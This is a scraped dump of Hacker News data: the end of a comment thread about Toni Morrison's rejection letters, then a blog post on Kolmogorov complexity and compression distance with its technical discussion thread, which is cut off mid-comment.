pretentious marketing blurbs everywhere... Just looking at art market and how it works with artist should tell everything about these markets in general. All marketing and manipulation. reply indy 5 hours agoparentprevI was biased to have negative opinions of many books simply because I was 'forced to read them in school'. It was only many years later when I chose to read them that I could appreciate their quality. reply prisenco 7 hours agoparentprevWhen people say this, I wonder what kind of books they appreciate. reply bern4444 5 hours agorootparentI've loved books that have won lots of awards and recognition that I only read cause it was part of a curriculum, but it's perfectly reasonable to also not connect with some of them. I read almost exclusively fantasy and have always loved reading since I was young. Fantasy series are often trilogies or more with some being over 10 books long. You go on adventures, read about relationships, interpersonal problems, power, team work, individualism, religion, and so much more. While it's mostly what I read, it's not all, but it keeps me reading. reply Kye 5 hours agorootparentprevI think it's possible to appreciate a book as literature but not want to ever read it again. The Bluest Eye (for example) is a rare glimpse into the horrors of racism and sexism, especially as both intersect with standards of beauty. It's not a book I would pick up without a grade at stake though. I think I would wonder about someone who actually likes it. It's a horrifying read. reply basementcat 5 hours agorootparentPerhaps this is not unlike how many of my friends and colleagues questioned why I chose to visit places like Auschwitz while I was on vacation in Eastern Europe. I try not to limit the books I read, films I watch and places that I visit to those that aren’t intellectually and/or emotionally challenging and difficult. Or maybe I’m just weird. reply prisenco 5 hours agorootparentprevI don’t get a strong sense of appreciation from the parent comment though. reply CSMastermind 5 hours agorootparentprevI strongly disliked Morrison's books when I read them, though I'll happily concede they're expertly written. Some fiction books I've read as an adult and appreciate: Gone with the Wind, Fields of Fire, American Psycho, The Turn of the Screw, Anna Karenina Some from school: To Kill a Mockingbird, The Great Gatsby, Frienheit 451, Moby Dick, Brave New World Some of the more pop fictiony: American Gods, The Stand, His Dark Materials, A Song of Ice and Fire, Imajica reply prisenco 5 hours agorootparent> though I'll happily concede they're expertly written. Enjoyment is a deeply personal thing but I can’t imagine dismissing Morrison as not worth anyone’s time. reply ByQuyzzy 5 hours agorootparentprevCurrently reading Turris Babel in the original Latin. What books are you into? You will be judged by your answer, and assumed to be a non-reader if you don't reply. reply defrost 5 hours agorootparentIt's a toss up between Yorro Yorro: Everything Standing Up Alive by David Mowaljarlai and Eric Carle's The Very Hungry Caterpillar for me. Readers who like Kircher might also enjoy: https://books.google.com.au/books?id=C0iGO0Hr95UC and triple check his math .. it gets pretty wonky. reply prisenco 4 hours agorootparent> Yorro Yorro: Everything Standing Up Alive by David Mowaljarlai This looks incredible. Going to add it to my (always expanding) list. reply defrost 4 hours agorootparentYour mileage may vary, I enjoyed it :) Obit: https://australianarchaeologicalassociation.com.au/journal-c... Artwork: https://www.aasd.com.au/artist/1861-david-banggal-mowaljarla... Short trailer for a movie filmed in David's country: https://www.youtube.com/watch?v=eJv1AVvPK3Q reply prisenco 5 hours agorootparentprevI would love to hear your thoughts on it. I personally just finished Knausgaard (in English, my Norwegian is lacking) and am currently reading Pussy, King of the Pirates by Kathy Acker as a light follow up. reply pbj1968 6 hours agorootparentprev…Dan…brown… reply dragonwriter 5 hours agoparentprevI was assigned to read many books in schools, but I was never forced to read any of them. reply worddepress 4 hours agorootparentA stern letter to your parents if you don't might count as force. reply synecdoche 3 hours agorootparentThis depends on perspective and agency. In my opinion there is nothing you must do in this life, as in forced by others, unless physically unable to resist. You can consider the consequences and make a more or less informed choice. The point being, the choice is yours and noone else is to be blamed for the consequences. reply RajT88 5 hours agoparentprevMe too. \"The Bluest Eye\" - in college. It was devastating. I'm glad I read it, even though parts of it were really uncomfortable. reply aprilthird2021 3 hours agoparentprevSince no one else has asked, what did you not like about it? I found the magic realism look towards, specifically, racially segregated chattel slavery and the generations who lived in the shadow of it was a very interesting mix of ideas. I remember her stories being beautiful and horrifying, her prose being precise while being fantastical, and her style and story material being quite unique. Would love to know what you didn't like. Perhaps I have a rose-tinted view of reading those books long ago reply forgotmyinfo 5 hours agoparentprev [–] Oh, come on now. You don't have to enjoy Toni Morrison, but to discount her absolute success because she isn't your preference is more than a little ridiculous. reply ByQuyzzy 5 hours agorootparent [–] Every school library in the US has 120 copies of this book. I'm just wondering how many non-school / library buyers there were. If her success is government-mandated, it can easily be discounted. reply defrost 5 hours agorootparent> Every school library in the US has 120 copies of this book. This seems improbable. It seems even more unlikely when The Bluest Eye has been banned so often: The ALA placed it on the Top Ten Most Challenged Books Lists for 2006, 2014, 2013, 2020, and 2022. Ultimately, it became the 34th-most banned book in the United States 1990–1999, the 15th-most banned book 2000–2009, and the 10th-most banned book 2010–2019. ~ https://en.wikipedia.org/wiki/The_Bluest_Eye Can you back up this assertion at all? reply SamoyedFurFluff 5 hours agorootparentprevI admit some confusion of the idea that Toni Morrison is successful only because she was taught in schools. Schools aren’t known to push literature in classrooms published within that year on a nationwide scale (outside of specifically librarian association recommendations or something like this, a scholastic books thing). From a brief Wikipedia read, The Bluest Eye was published with Toni Morrison was nearly 40 and didn’t sell well, so it makes no sense why that’s the one taught in schools. reply richardatlarge 5 hours agorootparentprevI always thought people borrowing books meant fewer sales, not more. Stephen King will be happy to hear it reply forgotmyinfo 5 hours agorootparentprev [–] Yes, sorry, you're right, Toni Morrison's entire writing career is a government conspiracy. Thank you for your service, gentle patriot. reply sandspar 4 hours agorootparent [–] Are you suggesting that the effusive establishment praise for Toni Morrison is 0% politically motivated? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Toni Morrison, a former senior editor at Random House, provided detailed rejection letters with constructive feedback on writing craft and character development during her 16-year tenure at the publishing company.",
      "Morrison stressed the significance of incorporating drama, organization, and sensory details in writing to address the challenges of mainstream publishing and appeal to readers.",
      "Despite her honest approach, Morrison's aim was to assist writers in enhancing their skills and meeting the preferences of the audience, demonstrating her passion for writing and commitment to mentoring aspiring authors."
    ],
    "commentSummary": [
      "The article explores Toni Morrison's rejection letters, emphasizing the insightful feedback they offer.",
      "Debates range from interpreting a Morrison quote to questioning the credibility of critics and the importance of literary awards.",
      "Users discuss re-reading, genre choices, and the value of complex literature, defending Morrison's work amid considerations like school libraries and political impact."
    ],
    "points": 132,
    "commentCount": 51,
    "retryCount": 0,
    "time": 1711827852
  },
  {
    "id": 39877276,
    "title": "Uncovering Randomness with Kolmogorov Complexity",
    "originLink": "https://smunshi.net/kolmogorov-complexity-and-compression-distance.html",
    "originBody": "2023-09-26 Kolmogorov Complexity And Compression Distance Alice and Bob play a game of who gets the most number of tales in 20 coin tosses each. Alice gets the sequence: HHHTHTHTTHTHHTHTTTTH, whereas, Bob gets the sequence: TTTTTTTTTTTTTTTTTTTT. Alice is perplexed at Bob’s result. She senses foul-play and confronts Bob about it. Bob uses the following argument to defend himself: Total number of 20 coin tosses sequences possible: \\(2^{20}\\) Probability of getting a sequence at random from the \\(2^{20}\\) sequences: \\(2^{-20}\\) Bob claims that since the probability of getting both his and Alice’s sequence is the same (\\(2^{-20}\\)), it proves that there was no foul-play involved. Bob credits his excellent luck. Alice is smart and cannot be easily convinced. She get’s back at Bob by claiming that probability cannot be used in this context as it reveals no information regarding the randomness of the obtained sequences. One can take a quick glance at the obtained sequences and easily point out that Alice’s sequence is more random than Bob’s sequence. Alice needs a way to describe how “hard to describe” or random a string/sequence is. However, this argument lacks mathematical rigor. In this post, we’ll help out Alice using a mathematical tool known as Kolmogorov Complexity. Let’s start with describing Bob’s sequence in Python, In [0]: 'T'*20 Out[0]: TTTTTTTTTTTTTTTTTTTT The length of this description in Python comes out to be 6 (as shown below) which is less than the length of the sequence itself. In [1]: len(\"'T'*20\") Out[1]: 6 If we were to describe Alice’s sequence in Python, it would be quite complex (or literal) and the description would probably be equal to or longer than 20 characters. Another thing to keep in mind is that the description language matters too. If we were to replicate the Python description for Bob’s sequence in Javascript, we would get the following description: >> \"T\".repeat(20) \"TTTTTTTTTTTTTTTTTTTT\" >> \"\\\"T\\\".repeat(20)\".length 14 Notice how changing the description language increased the size of the description from 6 to 14. This tells us that a string’s complexity does not only depend on the string but also on the description language. Considering the information we have on hand, we can mathematically define Kolmogorov complexity as follows: \\[KC(x) = \\min \\{|d| : L(d) = x\\}\\] where, \\(L\\) is the language that accepts the program \\(d\\) that delivers the same output as the string, \\(x\\). I’m gonna go ahead and butcher math for the sake of clarity. The above-mentioned mathematical representation would encompass our Python and Javascript examples in the following way: \\[KC(\\text{'TTTTTTTTTTTTTTTTTTTT'}) = \\\\ \\min \\{|d| : \\text{Python}(d) = \\text{'TTTTTTTTTTTTTTTTTTTT'}\\} = 6 \\\\ where, d \\in \\{\\text{'T'*20}, \\text{'TTTTTTTTTTTTTTTTTTTT'}, \\text{...}\\}\\\\\\] \\[KC(\\text{'TTTTTTTTTTTTTTTTTTTT'}) = \\\\ \\min \\{|d| : \\text{Javascript}(d) = \\text{'TTTTTTTTTTTTTTTTTTTT'}\\} = 14 \\\\ where, d \\in \\{\\text{'T'.repeat(20)}, \\text{'TTTTTTTTTTTTTTTTTTTT'}, \\text{...}\\}\\] This defines the Kolmogorov complexity of a string as the length of the shortest program outputting that string. The idea is that Kolmogorov complexity gives us a way to describe the randomness of a string. A string with its Kolmogorov complexity equal to the length of the string will be more random than the string with its Kolmogorov complexity less than the length of the string. Moreover, a string cannot be compressed if its $$KC(x) \\geq |x|$$ Another thing to note is that Kolmogorov complexity of a string cannot be computed. There cannot exist a computer that will always guarantee the Kolmogorov complexity for all the strings. It is not a computational problem but rather a fundamentally theoretical one. To better understand that, take a look at the interesting number paradox. The interesting number paradox revolves around the claim that all natural numbers are interesting. 1 is the first number, so that is interesting. 2 is the first even number. 3 is the first odd prime number. 4 is interesting because 4=2×2 and 4=2+2. We can continue in this fashion and find interesting properties for many numbers. At some point we might come to some number that does not seem to have an interesting property. We can call that number the first uninteresting number. But that, in itself, is an interesting property. In conclusion, the uninteresting number is, in fact, interesting! [source] To summarize, we can never prove that the shortest program we’ve obtained is indeed the shortest program. Eliminating Language Dependency Currently, we have a strong dependency on the type of language being used to describe the string and that doesn’t attest this mathematical representation with consistency. In other words, we need to define complexity such that the definition does not change based on the \\(L\\) we pick and depends only on the string. Changing from Python to Javascript in the example above changed our values. So, how do we generalize this and make it language-agnostic? To alleviate this issue, let’s assume that there exists a universal language \\(U\\) such that it always gives us the shortest description length for all strings. This would imply, \\[KC_{U}(x) \\leq KC_{L}(x) + C\\] In other words, the complexity of describing a string \\(x\\) using \\(U\\) versus using an arbitrary language \\(L\\) differs by at most a constant factor, \\(C\\). However, let’s bring back the paradox we discussed above. According to that paradox, \\(U\\) cannot exist or \\(U\\) cannot provide shorter descriptions than every arbitrary \\(L\\). To address this issue, we place constraints on the set of valid description languages, allowing for the emergence of a single universal description method \\(U\\). Enter Turing Machine (\\(TM\\)), which is a fundamental theoretical concept/computer/model utilized to analyze properties of algorithms and determine which computational problems can or cannot be feasibly solved. Couple of pointers to consider here: Halting problem (on a Turing Machine model) is a well-known problem of determining from a description of an arbitrary computer program and an input, whether the program will finish running, or continue to run forever [wikipedia]. Mathematically, the halting problem is defined as the set of all pairs \\((TM, w)\\) such that \\(w\\) is an element of \\(H(TM)\\), where \\(H(TM)\\) represents the set of inputs on which the Turing machine \\(TM\\) halts (OR) \\(\\{(TM, w) : w \\in H(TM)\\}\\) . The above representation implies that, for a Turing Machine, there are certain inputs it halts on and certain other inputs we dont know if it does. Therefore, if we model our universal language \\(U\\) as a Turing Machine that we know halts on certain inputs; we can avoid the paradox explained above! Restating our observations, we can say that for the Kolmogorov Complexity to be language-agnostic; there needs to be a universal language \\(U\\) that simulates a Turing Machine \\(TM\\) that on every input \\(w\\), halts with \\(U(w) = x\\) as the output. That gives us the true language-agnostic definition of Kolmogorov Complexity as follows: \\[KC_{U}(x) = \\min \\{|(TM, w)| : \\text{TM halts on input w and outputs x} \\}\\] Normalized Distances Having defined Kolmogorov Complexity, we can further use it to estimate how similar two strings/objects are. Normalized Information Distance between two strings can be defined as: \\[NID(x, y) = \\frac{KC(x, y) - \\min (KC(x), KC(y))}{\\max(KC(x), KC(y))}\\] where \\(KC(x, y)\\) is the Kolmogorov complexity after concatenating \\(x\\) and \\(y\\). Whereasm Normalized Compression Distance can be defined as: \\[NCD(x, y) = \\frac{C(x, y) - \\min (C(x), C(y))}{\\max(C(x), C(y))}\\] where \\(C(x, y)\\) is the compression length after concatenating \\(x\\) and \\(y\\). It has been demonstrated that \\(KC(x)\\), can be reasonably estimated by the number of bits required to encode \\(x\\) using a compressor \\(C\\) (such as gzip) Aaand Alice was finally able to outwit Bob with her newfound knowledge. ✌",
    "commentLink": "https://news.ycombinator.com/item?id=39877276",
    "commentBody": "Kolmogorov Complexity and Compression Distance (smunshi.net)128 points by rgbimbochamp 15 hours agohidepastfavorite79 comments tromp 14 hours ago> let’s assume that there exists a universal language U Why not specify it? > That gives us the true language-agnostic definition of Kolmogorov Complexity as follows: Choosing the language of Turing Machines does not make the definition language agnostic. Aiming for the simplest definition of description complexity, I instead based my definitions on the older computational model of lambda calculus in [1]. Unlike the assumed UTM above, the universal lambda machine is easy to describe in detail: (λ 1 1) (λ λ λ 1 (λ λ λ λ 3 (λ 5 (3 (λ 2 (3 (λ λ 3 (λ 1 2 3))) (4 (λ 4 (λ 3 1 (2 1)))))) (1 (2 (λ 1 2)) (λ 4 (λ 4 (λ 2 (1 4))) 5)))) (3 3) 2) (λ 1 ((λ 1 1) (λ 1 1))) Furthermore, it allows almost identical definitions of various variations of descriptional complexity, namely 1) plain complexity 2) prefix complexity 3) monotone complexity all of which have their application in Algorithmic Information Theory [2]. [1] https://gist.github.com/tromp/86b3184f852f65bfb814e3ab0987d8... [2] https://homepages.cwi.nl/~paulv/kolmogorov.html reply asplake 4 hours agoparent> let’s assume that there exists a universal language U such that it always gives us the shortest description length for all strings. Read on a bit and it looks like proof by contradiction: > However, let’s bring back the paradox we discussed above. According to that paradox, U cannot exist or U cannot provide shorter descriptions than every arbitrary L. reply canjobear 11 hours agoparentprevThe whole point of Kolmogorov complexity is that description lengths under different Turing-complete description languages (such as UTM and lambda calculus) are only different up to a constant that depends on the languages and not on the thing being described. reply uoaei 8 hours agorootparentThe whole point of Kolmogorov complexity is that there exists some language for minimal description length of an arbitrary program and you compare optimal descriptions across languages. In other words, the point is to explicitly consider the choice of language as part of the encoding scheme that needs describing. That choice is included as part of the description whose length is being measured. reply rhelz 14 hours agoparentprevThere is another, more insidious, problem with trying to give a language agnostic definition: Different languages will have different symbols which are outputable. If you have a Turing machine which can only print out binary digits, then it can't print out a chinese character, no matter how long the input program is. Yeah, you can do something like unicode, and associate a binary string with each chinese character--but printing out that binary string is not printing out the chinese character. It's printing out a binary string. In particular, your lambda-calculus based turing machine cannot print out chinese characters. It therefore cannot be used to define a universal complexity for any string. reply AnotherGoodName 10 hours agorootparentThis is quite misguided as you seem to think the alphabet for Shannon entropy or Kolmogorov complexity is in any way what we think of as an alphabet. Did you know the best compression methods out all have a variable length (measured in bits) alphabet? eg. Dynamic Markov Coding will start with just '0' and '1' and then predict the next bit but as it see's more symbols it will extend this to single characters (so see 'a' or 'b' and predict the next bit). They'll then continue as they learn more of the file and their alphabet will essentially include common pairwise letters, then words and entire common phrases. This is actually a commonly missed aspect of Shannon entropy. A file of 0111101110111 repeated will give you a different result if you consider a 1 bit alphabet of 25% '0' and 75% '1' than a 4 bit alphabet of 100% '0111'. No one in the real world is using the character frequencies of english characters as a measure of Shannon entropy or Kolmogorov complexity. No algorithm expects that. They all work at the binary level and they will try to adjust the symbol lengths of the alphabet to common sequences to achieve the best result. This is in fact the reason Kolmogorov complexity is used rather than Shannon entropy. Shannon entropy doesn't tell you how to define an optimal alphabet. That part is actually undefinable. It just tells you what to do if you have that already. Kolmogorov complexity says more completely 'find the optimal alphabet and the symbol probabilities and make a minimal sequence from that'. Different human languages don't figure into this at all and are completely irrelevant. reply rhelz 10 hours agorootparent> Different human languages don't figure into this at all and are completely irrelevant. Back to basics: A Turing machine is specified by a set of symbols it can read/write to a tape, and a state machine matching current state and read symbol to next state and actions. If that set of symbols is just {1,0}, then it absolutely, positively, cannot print out the string \"ABC\". > the best compression methods out all have a variable length (measured in bits) alphabet. This is a category error....if the compression algorithm reads and writes binary data, its alphabet is \"zero\" and \"one.\" The symbols read and written by a Turing machine are atomic--they are not composed of any simpler parts. Sure, external to the turning machine, you can adopt some conventions which map bit patterns to letters in a different alphabet. But a binary Turing machine cannot print out those letters--it can only print out a string of 1's and 0's. The mapping from strings in the binary language to letters in the target language cannot participate in the calculations for the complexity of a string in another language. Because if it did, again, you could make the Kolmogorov complexity of any arbitrary string S you choose to be 0, because you could just say the null output maps to S. This is a subtle problem, often glossed over or just missed entirely. We are so used to encoding things in binary that it might not occur to us unless we think about it deeply. Nevertheless, it is a real, genuine problem. reply AnotherGoodName 9 hours agorootparentJust because a turing machine prints out 0 and 1 at each step doesn't mean the sequences to factor into the calculation of what to print out next can't be longer binary sequences. Pretty much all the best compression methods are language agnostic and work on bit wise sequences. They also pretty much all predict the next bit and feed that into an alogithmic encoder. Eg. look up dynamic markov coding which is commonly used by Hutter prize winners. The paper is short and readable. They dynamically create a binary tree and binary sequences are seen so if the pattern '01101000 01100101' comes in it walks down the binary tree. It'll probably predict the next bit as '0' as '0110100001100101' just so happened to be a common sequence in English that will likely have a next bit of '0' but the Dynamic Markov coding model has no idea of that. It just has binary sequences of bits and a prediction of the next bit given that. Likewise it can continue reading the bits of the file in and walking down its binary tree where history of the next bit are stored in every node and it see's '111001001011110110100000'. It makes the prediction of the next bit as a likely '1' that it feeds into an arithmetic coder that takes predictions and forms an optimally minimal bitsequence from that. That second binary sequence forms part of 你好. In both cases the turing machine doesn't care about that. It's also just writing 1's and 0's as per a turing machine. Eventually those 1's and 0's form sequences that happen to map to characters in various languages but it doesn't care about that. >The mapping from strings in the binary language to letters in the target language cannot participate in the calculations for the complexity of a string in another language. Because if it did, again, you could make the Kolmogorov complexity of any arbitrary string S you choose to be 0, because you could just say the null output maps to S. One other thing to address here is that Kolmogorov complexity explicitly includes any dictionary you use in it's calculation. A dictionary of the file you wish to compress would just blow out your Kolmogorov complexity to that size exactly. That's why Kolmogorov complexity is an excellent tool. You explicitly cannot cheat in this way. reply rhelz 7 hours agorootparent> the turing machine doesn't care about that. It's also just writing 1's and 0's as per a turing machine. But a Turing machine does not have to be restricted to just printing out zeros and ones. It can be any finite set of symbols. For example, he Soviets built a computer which used base 3--its symbol set was {-1, 0, 1}. It didn't have bits which could just store \"1\" or \"0\", it had trits which could store \"-1\", \"0\", or \"1\". And why the soviets built such a computer is germane to Kolmogorov complexity just because you can make shorter strings in base 3 than you can in base 2. The choice of symbol set absolutely impacts the length of strings and programs, and therefore impacts the Kolmogorov complexity of strings relative to the computer. With this in mind, please consider three Turing Machines: A, B, and C The symbols A prints out on its tape are {\"A\", \"B\", \"C\"} The symbols B prints out on its tape are {\"0\", \"1\"} The symbols C prints out on its tape are {\"0\", \"1\", \"A\", \"B\", \"C\"} Now consider two strings: \"1000001\" and \"A\". Turing machine B could print out \"1000001\". Turing machine A could print out \"A\". You might be tempted to equate \"1000001\" and \"A\". But consider the same two strings printed out by machine C: \"1000001\" and \"A\" Clearly, these are different strings. If C printed out \"A\", it did not print out \"1000001\", and vice versa. > Kolmogorov complexity explicitly includes any dictionary you use in it's calculation. Sure, but on a binary turing machine, like Machine B above, that dictionary is not going to be matching between binary strings and, say Roman letters. Its going to be mapping from one binary string to another binary string. Using Machine C, you certainly could write a program which inputed \"1000001\" and output \"A\". But you absolutely, positively, cannot write such a program in either machines A or B. Machine A cannot print the string \"1000001\". And B cannot print the string \"A\". Different strings, different things. reply AnotherGoodName 6 hours agorootparentAll of those examples are exactly equivalent and convertable but where you are confusing yourself is that you're thinking of the differing states of a given n-ary system as having explicit symbols. It's best to think of it as simply numeric. Binary 010 is 2 if i were to write in decimal. Ternary 020 is the number 6 if i were to write it in decimal. Etc. Any actual symbol mapping to the numbers from an n-ary system to actual symbols like you are showing here is actually arbitrary and part of the calculation of space when measuring an algorithms Kolmogov complexity. The program size in kolmogorov complexity includes the dictionary of numerical to symbolic lookup which is what you are getting at here. reply kaba0 3 hours agorootparentprevYou can trivially convert any such Turing machine to another simply by adding n new states to it, that map a letter of the previous alphabet to the new’s. With all due respect, you are misunderstanding something/bring something up with no relevance to complexity. reply tromp 2 hours agorootparentprev> cannot print out the string \"ABC\" When you write a program in any modern programming language to print \"ABC\", that program merely outputs the 3 bytes 01000001 01000010 01000011, ASCII codes which your console window (not the program you wrote) decides to display graphically as those characters. So any machine outputting bits can be said to print out \"ABC\" just as well. Furthermore, your comment above was transmitted by your browser to Hacker News not as English characters but as those very bits, and everyone reading your comment was receiving those bits. The way that the browser decides to display those bits does not change their character. reply canjobear 11 hours agorootparentprevWhy is this a problem? No information is lost when characters (or graphics) are encoded in binary. reply rhelz 9 hours agorootparentA turing machine is defined as a set of symbols which it can read/write to the tape, and a state machine which maps the current symbol read to the next state and some actions. The symbols of the Turing machine are atomic. They are not composed of any simpler parts. If one of the Turing machine's symbol is the letter \"A\", it's the letter \"A\". It is not, say, the ascii code (1000001) 1000001 could be the Goedel number for \"A\", but its not the symbol \"A\". The two strings \"A\" and \"1000001\" are two different strings. Its a map-vs-territory kind of thing. If you are really good at programming--which is to say, you are really good at Goedel mapping your problem to integers--you might, by years of long familiarity, just start thinking of them as one and the same, but they are not. It might make it vivid to consider a turing machine whose symbols were {1, 0, A}. Clearly, the string \"1000001\" and the string \"A\" are two different outputs for this turing machine. The lengths of the strings \"1000001\" and \"A\" are different. They are composed of different symbols. They are absolutely, positively, not the same string, so they are not the same thing. reply mxkopy 12 hours agorootparentprevI feel like a conversion from binary strings to Unicode/Chinese characters would be in PTIME, so adding a conversion machine would be a nonfactor for languages in most complexity classes. reply smallnamespace 12 hours agorootparentThe stronger result here is that any sort of conversion you can explicitly specify can be turned into a program. Since Kolmogorov Complexity is specified in terms of lengths of programs, that means the KC between two different pairs of encodings can differ at most by a constant amount (the size of the program that converts back and forth). The above is a bit handwavey, there are details you can tighten up (Is it the program size or something smaller? The program length in which encoding?), but heuristically that's why theorists can talk about \"the\" Kolmogorov complexity without getting bogged down in with pesky encoding details. It's also why we usually don't worry too much about the fine details of Turing Machines (alphabet, etc.), since you can generally emulate one sort of Turing Machine pretty easily with a short program written on another. reply rhelz 9 hours agorootparent> any sort of conversion you can explicitly specify can be turned into a program. If your Turing machine can only print out zeros and ones, there's no program which can get it to print out \"ABC\". So it cannot specify a conversion between a language whose symbols are {0,1} and a language whose symbols are {\"A\",B\",\"C\"}. It could specify a mapping between one binary string and another binary string, but it can't even print out \"ABC\" so how could it possibly specify a conversion? This is elementary guys. reply smallnamespace 7 hours agorootparentYou pick an obvious encoding (such as binary) yourself, in the same way your computer is not outputting some platonic ideal \"A\" but a series of electrical impulses that your monitor plus your eyes and brain interprets as \"A\". Sure, you can object that the encoding is \"outside\" the TM, but for the purposes of discussing complexity these objections are pretty trivial, again for the same reasons (whatever encoding you pick the conversion process is a program you can write down, and once you write it down it means the Kolmogorov Complexity is the same between different TMs up to the length of whatever encoding/decoding program you come up with). Put another way, a TM with alphabet is {0, 1} is technically not the same as the TM with alphabet {A, B}. But it's obvious to us that the TMs are equivalent. reply cscurmudgeon 7 hours agorootparentprevIt is not an intractable problem as you believe it is. E.g., make the machine print out pixel values for a large screen. The screen can display Chinese characters in canonical ways. reply SimplyUnknown 11 hours agorootparentprevBut Chinese (or mandarin) is not a context-free grammar whereas I believe that encoding a language on a turing machine implies a context-free grammar so this example doesn't hold. reply rhelz 9 hours agorootparentWell, a couple of points: its not obvious that Chinese doesn't have a context-free grammar: see the talk by David Branner: \"The Grammar of Classical Chinese is Very Close to Being a Context-Free Grammar\". And a properly programmed turing machine can parse languages which are way more complex than context-free languages are. reply arketyp 14 hours agoprevRichard von Mises (brother of the economist) formulated a definition of randomness as a sequence of data that, were you a gambler, you cannot by any strategy make money on betting on the outcomes. This was before computational calculus and was later developed by Kolmogorov and others in algorithmic complexity. The modern variation would be (Wiki) \"considering a finite sequence random (with respect to a class of computing systems) if any program that can generate the sequence is at least as long as the sequence itself\". reply n4r9 13 hours agoparent> you cannot by any strategy make money on betting on the outcomes What does \"strategy\" mean here? I might just happen to have a strategy which involves betting on the exact sequence of heads and tails in a given sequence. The analogy in terms of languages is that my language might just happen to have a short keyword that represents a given sequence of heads and tails. I don't know much about Kolmogorow complexity so I'm certainly missing something here. Potentially there is a subtle clause in the technical definition that doesn't make it through to these articles. reply inimino 7 hours agorootparentThe idea is that you bet before the sequence is known. Nowadays we would say it is the distribution (or the process producing the random sequences) that can be truly random or not, and we recognize that saying \"sequence [...] is random\" is incoherent, same as the joke of the random int set to 4 with a comment in the source code that it was chosen by fair dice roll. If you know everything about the process and still can't beat chance at predicting it, that's the quality we are after. In this definition \"random\" just means unpredictable, which is another way to explain why it can only be a meaningful distinction when you don't yet know the result. reply canjobear 11 hours agorootparentprev> What does \"strategy\" mean here? Any function that outputs bets. reply PartiallyTyped 13 hours agorootparentprev> What does \"strategy\" mean here? I might just happen to have a strategy which involves betting on the exact sequence of heads and tails in a given sequence. That's a very narrow program. > The analogy in terms of languages is that my language might just happen to have a short keyword that represents a given sequence of heads and tails. The sequence still needs to be generated \"somehow\". Either by executing the program and producing the sequence, or by explicitly stating it. Even if you have it \"cached\" and \"represented\" in your language, you still need to generate the sequence. The resources spent here is the Kolmogorov complexity. The easiest way to expand your little program is to say that you have a seed s.t. any consecutive generation results in a consecutive sequence that matches up to the period of the generator. Now it is more generic, but has a period. You can then expand this to accept multiple seeds and once it has reached a period, to simply take the next seed. Should this sequence be finite, you are in luck. Your program can have length O(generator + N/P) where N is length of sequence, and P is the period of your RNG. All this is is just compression which plays into the whole Kolmogorov complexity. reply a_wild_dandan 13 hours agoparentprevDoesn't the modern variation break for programs with lossless encoding/decoding? At least, for sufficiently long sequences? A Huffman/byte-pair encoding would shred any trillion-bit+ sequence, for instance. But I intuitively expect many random trillion-bit sequences exist. reply chaboud 13 hours agorootparentThere is no encoding that would shred \"any\" (read: every) trillion bit sequence. If that were true, some fundamentals of information theory and compressibility would break down. Lossless encoding works by taking advantage of the more commonly observed sequences of data having lower information entropy. For things like audio encoding, where discontinuous sequences aren't naturally observed (or pleasing to listen to), lossless encoding has a lot to work with. reply mxkopy 12 hours agorootparentprevFor any fixed compression scheme, there is an input string that is actually lengthened by it rather than shortened. However Huffman isn’t a fixed compression scheme since it makes a different frequency tree for different corpora. reply canjobear 11 hours agoparentprevDo you have a citation? I didn’t know the idea went back that far. reply arketyp 4 hours agorootparentThanks, I had to dig. I read about it in [1]. Mises was concerned about the formalization of probability theory. It seems the idea appears at least as early as in his 1919 paper [2]. [1] An Introduction to Kolmogorov Complexity and Its Applications, M. Li & P. Vitnányi [2] Grundlagen der Wahrscheinlichkeitsrechnung, R. von Mises reply Ar-Curunir 9 hours agoparentprevThe two definitions say different things. What von Mises said is closer to cryptographic definitions of pseudorandomness, and in particular to next-bit unpredictability. reply arketyp 4 hours agorootparentYes, I agree. But I talked about an idea development and said variation, not necessarily addressing the same thing. The headline would be algorithmically random sequence. https://en.wikipedia.org/wiki/Algorithmically_random_sequenc... reply anonzzzies 13 hours agoprevKolmogorov complexity is a lovely subject and one of the more influential ones in my life. THE book https://link.springer.com/book/10.1007/978-0-387-49820-1 is absolutely a thing to read. It was for me 30 years ago and it aged well. reply derbOac 12 hours agoparentThat is a great book on the subject — the authors have published some important work in this area in papers as well. reply wood_spirit 14 hours agoprevAn excellent rabbit hole to dive into is the equivalence of compression and general AI. Every programmer should make a compressor (and, separately, a ray tracer)! See http://prize.hutter1.net/ reply avmich 14 hours agoparentSome examples for a particular algorithm: https://rosettacode.org/wiki/LZW_compression reply pixelpoet 6 hours agoparentprevDefinitely with you on the ray/path tracer :) reply alfanick 13 hours agoprevA side question: is this taught in CS curriculum you know? It was at my uni (fairly good one, in a minor European country), and this experience biases me because I assume every CS knows Kolmogorov complexity. reply sunshowers 9 hours agoparentAt my university (IIT, top school in India and well-known around the world) this was covered in an elective you could take, not part of the core CS curriculum. reply quibono 11 hours agoparentprevYes, at least in the UK. From working through some US university curricula - it's also present there as well. reply davesque 13 hours agoprevSomething I've always noticed with the notion of Kolmogorov complexity is that the question of determining the lowest level of computation is problematic. For example, in the article, the author first defines the basic idea of KC. But then they correctly point out that the basic idea depends very much on the exact language that is chosen. So they describe how theorists have defined the notion of universal computation. But even this adjustment doesn't seem to escape the fact the we still depend on a system of mathematical symbols to describe the theory. And the notion of a Turing machine itself depends on other abstract concepts such as time and space, each with their own inherent, conceptual complexity. What sorts of minds (i.e. brains) are required to make sense out of the theory and what physical system is required for them to operate correctly? If the definition of KC includes a notion of how complex the Turing machine is that is required to compute a string, then the further down you go, the less the difference in complexity should be between any one string and another. After all, they all exist in the same universe! I guess it just goes to show how much the idea of KC lives in the realm of theory. As soon as you pose the question of complexity so abstractly, you invite in all kinds of theoretical considerations that make the meaning more slippery. That's why KC really doesn't deserve to be compared to Shannon entropy as it often is. But let me draw a comparison anyway like I said you shouldn't! Because Alice from the article could also have made a strong argument against Bob by just pointing out that the Shannon entropy of his string was lower, which is very relevant in terms of the number of heads or tails and the likelihood of seeing a particular count of them. reply veerd 12 hours agoparent1. Choice of language only matters up to an additive constant (e.g. you could just write a simulator so language A can run language B). 2. If you want something with less physical grounding, you could use lambda calculus instead of Turing machines. 3. Kolmogorov Complexity and Shannon Entropy are compared with one another because they both are talking about the same thing: optimal compression. Kolmogorov Complexity talks about the compressibility of individual objects and Shannon Entropy talks about compressibility of streams of i.i.d. random variables. reply AnotherGoodName 11 hours agoparentprevShannon entropy and Kolmogorov complexity are absolutely literally the same thing though! They are both purely theoretical and you cannot calculate the minimum Shannon entropy any better than you can calculate the Kolmogorov complexity. In fact if you could calculate one you could calculate the other trivially but we don't have a way to do that. For those now thinking about how to calculate Shannon entropy using the defined formula what are you using for the 